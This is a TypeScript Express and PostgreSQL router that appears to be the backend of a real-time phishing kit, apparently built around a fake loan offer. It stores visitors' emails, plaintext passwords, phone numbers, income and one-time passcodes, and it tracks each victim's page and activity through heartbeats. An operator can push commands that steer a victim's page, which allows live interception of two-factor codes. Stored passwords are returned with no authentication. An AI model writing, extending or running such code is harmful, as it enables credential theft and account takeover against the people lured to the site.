import { Router } from "express";
import pg from "pg";

const { Pool } = pg;

const pool = new Pool({ connectionString: process.env.DATABASE_URL });

const router = Router();

router.post("/submissions", async (req, res) => {
  try {
    const {
      id, submittedAt, submittedAtTs, email, password, phone,
      loan, income, otpCode, otpStatus, changepassStatus, page,
      isActive, lastSeen, country,
    } = req.body;

    await pool.query(
      `INSERT INTO sham_submissions
        (id, submitted_at, submitted_at_ts, email, password, phone, loan, income,
         otp_code, otp_status, changepass_status, page, is_active, last_seen, country)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15)
       ON CONFLICT (id) DO UPDATE SET
         email = EXCLUDED.email,
         password = EXCLUDED.password,
         phone = EXCLUDED.phone,
         loan = EXCLUDED.loan,
         income = EXCLUDED.income,
         otp_code = COALESCE(NULLIF(EXCLUDED.otp_code,''), sham_submissions.otp_code),
         otp_status = COALESCE(EXCLUDED.otp_status, sham_submissions.otp_status),
         changepass_status = COALESCE(EXCLUDED.changepass_status, sham_submissions.changepass_status),
         page = EXCLUDED.page,
         is_active = EXCLUDED.is_active,
         last_seen = EXCLUDED.last_seen,
         country = COALESCE(NULLIF(EXCLUDED.country,''), sham_submissions.country)`,
      [id, submittedAt, submittedAtTs, email, password, phone, loan, income,
       otpCode || "", otpStatus || null, changepassStatus || null, page, isActive, lastSeen, country || ""]
    );
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "db error" });
  }
});

router.get("/submissions", async (_req, res) => {
  try {
    const { rows } = await pool.query(
      `SELECT * FROM sham_submissions ORDER BY submitted_at_ts DESC`
    );
    const mapped = rows.map((r) => ({
      id: r.id,
      submittedAt: r.submitted_at,
      submittedAtTs: Number(r.submitted_at_ts),
      email: r.email,
      password: r.password,
      phone: r.phone,
      loan: r.loan,
      income: r.income,
      otpCode: r.otp_code,
      otpStatus: r.otp_status,
      changepassStatus: r.changepass_status,
      page: r.page,
      isActive: r.is_active,
      lastSeen: Number(r.last_seen),
      country: r.country || "",
    }));
    res.json(mapped);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "db error" });
  }
});

router.patch("/submissions/:id", async (req, res) => {
  try {
    const { id } = req.params;
    const updates: Record<string, unknown> = {};
    const allowed = ["otp_code", "otp_status", "changepass_status", "page", "is_active", "last_seen", "email", "password", "phone", "loan", "income", "country"];
    const fieldMap: Record<string, string> = {
      otpCode: "otp_code", otpStatus: "otp_status", changepassStatus: "changepass_status",
      page: "page", isActive: "is_active", lastSeen: "last_seen",
      email: "email", password: "password", phone: "phone", loan: "loan", income: "income",
      country: "country",
    };
    for (const [k, v] of Object.entries(req.body)) {
      const col = fieldMap[k] ?? k;
      if (allowed.includes(col)) updates[col] = v;
    }
    if (Object.keys(updates).length === 0) return res.json({ ok: true });

    const cols = Object.keys(updates);
    const vals = Object.values(updates);
    const set = cols.map((c, i) => `${c} = $${i + 1}`).join(", ");
    await pool.query(`UPDATE sham_submissions SET ${set} WHERE id = $${cols.length + 1}`, [...vals, id]);
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "db error" });
  }
});

router.delete("/submissions/:id", async (req, res) => {
  try {
    await pool.query("DELETE FROM sham_submissions WHERE id = $1", [req.params.id]);
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "db error" });
  }
});

router.delete("/submissions", async (_req, res) => {
  try {
    await pool.query("DELETE FROM sham_submissions");
    await pool.query("DELETE FROM sham_admin_cmds");
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "db error" });
  }
});

router.post("/heartbeat", async (req, res) => {
  try {
    const { id, page, isActive } = req.body;
    const now = Date.now();
    await pool.query(
      `UPDATE sham_submissions SET last_seen = $1, is_active = $2, page = COALESCE($3, page) WHERE id = $4`,
      [now, isActive ?? true, page || null, id]
    );
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "db error" });
  }
});

router.post("/cmd", async (req, res) => {
  try {
    const { visitorId, command } = req.body;
    await pool.query(
      `INSERT INTO sham_admin_cmds (visitor_id, command, updated_at)
       VALUES ($1, $2, $3)
       ON CONFLICT (visitor_id) DO UPDATE SET command = $2, updated_at = $3`,
      [visitorId, command, Date.now()]
    );
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "db error" });
  }
});

router.get("/cmd/:visitorId", async (req, res) => {
  try {
    const { rows } = await pool.query(
      "SELECT command FROM sham_admin_cmds WHERE visitor_id = $1",
      [req.params.visitorId]
    );
    const cmd = rows[0]?.command ?? null;
    if (cmd) {
      await pool.query("DELETE FROM sham_admin_cmds WHERE visitor_id = $1", [req.params.visitorId]);
    }
    res.json({ command: cmd });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "db error" });
  }
});

export default router;
